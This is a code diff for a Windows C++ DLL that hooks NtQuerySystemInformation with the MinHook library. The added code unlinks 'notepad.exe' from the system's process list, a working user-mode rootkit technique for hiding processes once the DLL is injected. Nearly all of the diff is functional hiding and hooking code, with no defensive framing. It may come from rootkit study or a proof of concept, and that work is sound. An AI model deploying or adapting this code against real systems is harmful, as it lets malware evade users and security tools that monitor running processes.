@@ -1,8 +1,8 @@
 #include <Windows.h>
-#include "../include/MinHook.h"
+#include "..\include\MinHook.h"
 #include "nt_structs.h"
 
-#pragma comment(lib, "../include/libMinHook.x64.lib")
+#pragma comment(lib, "libMinHook.x64.lib")
 
 PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation;
 PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation;
@@ -14,21 +14,49 @@ NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
 	ULONG SystemInformationLength,
 	PULONG ReturnLength)
 {
-	
+	NTSTATUS stat = New_NtQuerySystemInformation(
+		SystemInformationClass,
+		SystemInformation,
+		SystemInformationLength,
+		ReturnLength);
+
+	if (SystemProcessInformation == SystemInformationClass && stat == 0)
+	{
+		P_SYSTEM_PROCESS_INFORMATION prev = P_SYSTEM_PROCESS_INFORMATION(SystemInformation);
+		P_SYSTEM_PROCESS_INFORMATION curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);
+
+		while (prev->NextEntryOffset != NULL) {
+			if (!lstrcmp(curr->ImageName.Buffer, L"notepad.exe")) {
+				if (curr->NextEntryOffset == 0) {
+					prev->NextEntryOffset = 0;		// if above process is at last
+				}
+				else {
+					prev->NextEntryOffset += curr->NextEntryOffset;
+				}
+				curr = prev;
+			}
+			prev = curr;
+			curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
+		}
+	}
+
+	return stat;
 }
 
-void set_nt_hook()
+bool set_nt_hook()
 {
 	HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
 
 	Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");
 
-	if (MH_Initialize() != MH_OK) { return; }
+	if (MH_Initialize() != MH_OK) { return false; }
 
 	if(MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation, 
-		(LPVOID*) &New_NtQuerySystemInformation) != MH_OK) { return; }
+		(LPVOID*) &New_NtQuerySystemInformation) != MH_OK) { return false; }
 
-	MH_EnableHook(Original_NtQuerySystemInformation);
+	if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) { return false;  }
+
+	return true; 
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
@@ -36,9 +64,11 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 	switch(fdwReason)
 	{
 	case DLL_PROCESS_ATTACH:
-		set_nt_hook();
+		if (!set_nt_hook()) {
+			return FALSE;
+		}
 		break;
 	}
 
-	return true;
+	return TRUE;
 }
